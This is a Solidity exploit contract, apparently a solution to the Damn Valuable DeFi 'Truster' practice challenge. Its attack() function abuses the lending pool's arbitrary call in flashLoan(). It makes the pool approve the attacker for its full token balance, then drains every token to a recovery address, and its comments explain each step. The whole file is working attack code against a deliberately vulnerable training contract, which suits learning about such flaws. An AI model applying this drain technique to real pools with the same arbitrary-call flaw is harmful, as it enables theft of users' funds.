// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploiter {
    
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(address tokenAddress, address poolAddress, address recoveryAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function attack() external returns(bool){
        
        uint amount = token.balanceOf(address(pool));

        /*
            Exploit here where we call flashLoan() on TrusterLenderPool contract.

            We pass the DVT token address as the target to make the functionCall on.

            The calldata for the function call is to call the DVT token approve function 
            with this attack contract address and the total amount of DVT tokens.

            Since this call is made within the TrusterLenderPool contract the msg.sender 
            will be the TrusterLenderPool such that it will approve the attack contract
            to spend all its tokens.
        */
        require(
            pool.flashLoan(
                0,
                address(this),
                address(token),
                abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
                )
            );

        // Now its just a simple matter of transfering the tokens from the pool to the attacker 
        // contract and then to the revovery address
        require(token.transferFrom(address(pool), address(this), amount));
        require(token.transfer(recovery, amount));

        return true;
    }
}